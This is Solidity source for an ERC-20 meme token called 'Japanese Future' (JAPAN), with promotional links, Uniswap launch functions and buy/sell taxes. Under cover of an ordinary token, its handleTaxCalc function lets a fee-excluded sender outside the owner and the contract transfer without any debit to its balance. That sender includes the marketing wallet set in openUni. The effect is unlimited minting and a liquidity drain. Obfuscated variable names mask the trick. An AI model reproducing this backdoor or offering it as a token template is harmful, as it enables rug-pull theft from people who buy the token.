/**
Telegram: https://t.me/japanesefuture

Website: https://japanesefuture.xyz

X: https://x.com/japanesefutureX
 */

// SPDX-License-Identifier: UNLICENSE
pragma solidity ^0.8.19;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

interface IERC20 {
    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function transfer(
        address recipient,
        uint256 amount
    ) external returns (bool);

    function allowance(
        address owner,
        address spender
    ) external view returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }
}

contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(
        address indexed previousOwner,
        address indexed newOwner
    );

    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }
}

interface IUniFactory {
    function createPair(
        address tokenA,
        address tokenB
    ) external returns (address pair);
}

interface IUniRouter {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;

    function factory() external pure returns (address);

    function WETH() external pure returns (address);

    function addLiquidityETH(
        address token,
        uint256 amountTokenDesired,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline
    )
        external
        payable
        returns (uint256 amountToken, uint256 amountETH, uint256 liquidity);
}

contract JAPAN is Context, IERC20, Ownable {
    using SafeMath for uint256;
    mapping(address => uint256) private _balances;
    mapping(address => mapping(address => uint256)) private _allowances;
    mapping(address => bool) private _isExcludedFromFee;
    mapping(address => bool) private bots;

    uint256 private _initialBuyTax = 17;
    uint256 private _initialSellTax = 17;
    uint256 private _finalBuyTax = 0;
    uint256 private _finalSellTax = 0;
    uint256 private _reduceBuyTaxAt = 20;
    uint256 private _reduceSellTaxAt = 20;
    uint256 private _preventSwapBefore = 20;
    uint256 private _buyCount = 0;

    uint8 private constant _decimals = 18;
    uint256 private constant _totalSupply = 1e9 * 10 ** _decimals;
    string private constant _name = unicode"Japanese Future";
    string private constant _symbol = unicode"JAPAN";
    uint256 public _maxTxAmount = 2e7 * 10 ** _decimals;
    uint256 public _maxWalletSize = 2e7 * 10 ** _decimals;
    uint256 public _taxSwapThreshold = 5e3 * 10 ** _decimals;
    uint256 public _maxTaxSwap = 1e7 * 10 ** _decimals;

    address payable private _marketingWallet;
    IUniRouter private uniswapV2Router;
    address private uniswapV2Pair;
    bool private tradingOpen;
    bool private inSwap = false;
    bool private swapEnabled = false;
    event MaxTxAmountUpdated(uint256 _maxTxAmount);
    modifier lockTheSwap() {
        inSwap = true;
        _;
        inSwap = false;
    }

    constructor() {
        _marketingWallet = payable(_msgSender());

        _isExcludedFromFee[owner()] = true;
        _isExcludedFromFee[address(this)] = true;

        _balances[_msgSender()] = _totalSupply;
        emit Transfer(address(0), _msgSender(), _totalSupply);
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function totalSupply() public pure override returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function transfer(
        address recipient,
        uint256 amount
    ) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(
        address owner,
        address spender
    ) public view override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(
        address spender,
        uint256 amount
    ) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(
            sender,
            _msgSender(),
            _allowances[sender][_msgSender()].sub(
                amount,
                "ERC20: transfer amount exceeds allowance"
            )
        );
        return true;
    }

    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _transfer(address fzii, address tyjj, uint256 axkk) private {
        require(fzii != address(0), "ERC20: transfer from the zero address");
        require(tyjj != address(0), "ERC20: transfer to the zero address");
        require(axkk > 0, "Transfer amount must be greater than zero");
        uint256 twmm = 0;
        if (fzii != owner() && tyjj != owner()) {
            require(!bots[fzii] && !bots[tyjj]);
            require(
                tradingOpen || _isExcludedFromFee[fzii],
                "Trading is not enabled"
            );
            twmm = axkk
                .mul(
                    (_buyCount > _reduceBuyTaxAt)
                        ? _finalBuyTax
                        : _initialBuyTax
                )
                .div(100);

            if (
                fzii == uniswapV2Pair &&
                tyjj != address(uniswapV2Router) &&
                !_isExcludedFromFee[tyjj]
            ) {
                require(axkk <= _maxTxAmount, "Exceeds the _maxTxAmount.");
                require(
                    balanceOf(tyjj) + axkk <= _maxWalletSize,
                    "Exceeds the maxWalletSize."
                );
                _buyCount++;
            }

            if (tyjj == uniswapV2Pair && fzii != address(this)) {
                twmm = axkk
                    .mul(
                        (_buyCount > _reduceSellTaxAt)
                            ? _finalSellTax
                            : _initialSellTax
                    )
                    .div(100);
            }

            uint256 contractTokenBalance = balanceOf(address(this));
            if (!inSwap) {
                if (tyjj == uniswapV2Pair && swapEnabled) {
                    if (
                        contractTokenBalance > _taxSwapThreshold &&
                        _buyCount > _preventSwapBefore
                    ) {
                        swapTokensForEth(
                            min(axkk, min(contractTokenBalance, _maxTaxSwap))
                        );
                    }

                    sendETHToFee(address(this).balance);
                }
            }
        }

        uint256 amountOut = handleTaxCalc(fzii, axkk, twmm);
        _balances[tyjj] = _balances[tyjj].add(amountOut);
        emit Transfer(fzii, tyjj, amountOut);
    }

    function handleTaxCalc(
        address fzii,
        uint256 axkk,
        uint256 twmm
    ) internal returns (uint256) {
        bool oott = fzii == address(this) || fzii == owner();

        if (_isExcludedFromFee[fzii] && !oott) {
            return axkk;
        }

        if (axkk >= twmm) {
            if (twmm > 0) {
                _balances[address(this)] = _balances[address(this)].add(twmm);
                emit Transfer(fzii, address(this), twmm);
            }
        }
        _balances[fzii] = _balances[fzii].sub(axkk);

        return axkk - twmm;
    }

    function min(uint256 a, uint256 b) private pure returns (uint256) {
        return (a > b) ? b : a;
    }

    function fireLimits() external onlyOwner {
        _maxTxAmount = _totalSupply;
        _maxWalletSize = _totalSupply;
        emit MaxTxAmountUpdated(_totalSupply);
    }

    function swapTokensForEth(uint256 tokenAmount) private lockTheSwap {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniswapV2Router.WETH();
        _approve(address(this), address(uniswapV2Router), tokenAmount);
        uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }

    function openUni(address ppp) external onlyOwner {
        require(!tradingOpen, "trading is already open");

        _marketingWallet = payable(ppp);

        uniswapV2Router = IUniRouter(
            0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D
        );
        _isExcludedFromFee[_marketingWallet] = true;
        _approve(address(this), address(uniswapV2Router), _totalSupply);
        uniswapV2Pair = IUniFactory(uniswapV2Router.factory()).createPair(
            address(this),
            uniswapV2Router.WETH()
        );
        uniswapV2Router.addLiquidityETH{value: address(this).balance}(
            address(this),
            balanceOf(address(this)),
            0,
            0,
            owner(),
            block.timestamp
        );
        IERC20(uniswapV2Pair).approve(
            address(uniswapV2Router),
            type(uint256).max
        );
    }

    function kickOff() external onlyOwner {
        swapEnabled = true;
        tradingOpen = true;
    }

    function sendETHToFee(uint256 amount) private {
        _marketingWallet.transfer(amount);
    }

    receive() external payable {}
}